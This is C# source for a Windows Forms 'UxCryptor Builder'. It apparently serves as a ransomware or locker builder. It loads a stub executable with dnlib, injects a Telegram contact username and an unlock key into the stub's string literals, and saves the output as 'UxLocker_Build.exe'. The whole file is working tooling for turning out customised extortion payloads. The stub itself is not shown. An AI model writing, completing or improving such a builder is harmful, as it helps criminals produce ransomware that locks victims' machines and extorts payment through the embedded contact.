using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace MyBuilder
{
    public partial class FormUxCryptor : Form
    {
        private Panel panel1;
        private TextBox rjTextBoxUsername;
        private TextBox rjTextBoxPassword;
        private Button rjButtonSend;
        private Label labelUser;
        private Label labelPass;

        public FormUxCryptor()
        {
            SetupCustomUI();
        }

        private void FormUxCryptor_Load(object sender, EventArgs e)
        {
            this.Text = "UxCryptor Builder";
        }

        private void rjButtonSend_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(rjTextBoxUsername.Text) || string.IsNullOrWhiteSpace(rjTextBoxPassword.Text))
            {
                MessageBox.Show("Please fill in all fields!", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string stubPath = Path.Combine(baseDir, @"stub\stub.exe");

            if (!File.Exists(stubPath))
            {
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Executable|*.exe";
                    ofd.Title = "Select stub.exe template";
                    if (ofd.ShowDialog() == DialogResult.OK) stubPath = ofd.FileName;
                    else return;
                }
            }

            string outputPath = "";
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Executable|*.exe";
                sfd.FileName = "UxLocker_Build.exe";
                if (sfd.ShowDialog() == DialogResult.OK) outputPath = sfd.FileName;
                else return;
            }

            try
            {
                ModuleDefMD module = ModuleDefMD.Load(stubPath);
                string username = rjTextBoxUsername.Text;
                string unlockKey = rjTextBoxPassword.Text;

                int replacedCount = 0;
                foreach (TypeDef type in module.GetTypes())
                {
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Body == null) continue;

                        var instructions = method.Body.Instructions;
                        for (int k = 0; k < instructions.Count; k++)
                        {
                            if (instructions[k].OpCode != dnlib.DotNet.Emit.OpCodes.Ldstr) continue;

                            string operand = instructions[k].Operand as string;
                            if (string.IsNullOrEmpty(operand)) continue;

                            bool changed = false;

                            if (operand.Contains("%username%"))
                            {
                                instructions[k].Operand = operand.Replace("%username%", username);
                                changed = true;
                            }
                            if (operand.Contains("%unlockkey%"))
                            {
                                instructions[k].Operand = operand.Replace("%unlockkey%", unlockKey);
                                changed = true;
                            }

                            if (changed) replacedCount++;
                        }
                    }
                }

                var writerOptions = new dnlib.DotNet.Writer.ModuleWriterOptions(module);
                writerOptions.MetadataOptions.Flags |= dnlib.DotNet.Writer.MetadataFlags.PreserveAll;

                module.Write(outputPath, writerOptions);
                module.Dispose();

                MessageBox.Show($"Build Success!\nFile: {outputPath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Build Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SetupCustomUI()
        {
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Size = new Size(650, 250);
            this.BackColor = Color.FromArgb(32, 32, 32);
            this.ForeColor = Color.White;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Load += new EventHandler(this.FormUxCryptor_Load);

            panel1 = new Panel { Dock = DockStyle.Fill };
            this.Controls.Add(panel1);

            labelUser = CreateLabel("Telegram Username (With @)", 20);
            rjTextBoxUsername = CreateTextBox(45);

            labelPass = CreateLabel("Unlock Password", 80);
            rjTextBoxPassword = CreateTextBox(105);

            rjButtonSend = new Button
            {
                Text = "BUILD",
                Location = new Point(517, 150),
                Width = 93,
                Height = 35,
                BackColor = Color.FromArgb(128, 0, 128),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            rjButtonSend.FlatAppearance.BorderSize = 0;
            rjButtonSend.Click += rjButtonSend_Click;

            this.AcceptButton = rjButtonSend;

            panel1.Controls.Add(rjButtonSend);
        }

        private Label CreateLabel(string text, int y)
        {
            Label l = new Label
            {
                Text = text,
                Location = new Point(10, y),
                AutoSize = true,
                ForeColor = Color.DarkGray,
                Font = new Font("Segoe UI", 9)
            };
            panel1.Controls.Add(l);
            return l;
        }

        private TextBox CreateTextBox(int y)
        {
            TextBox t = new TextBox
            {
                Location = new Point(10, y),
                Width = 600,
                BackColor = Color.FromArgb(45, 45, 45),
                ForeColor = Color.White,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 10)
            };
            panel1.Controls.Add(t);
            return t;
        }
    }
}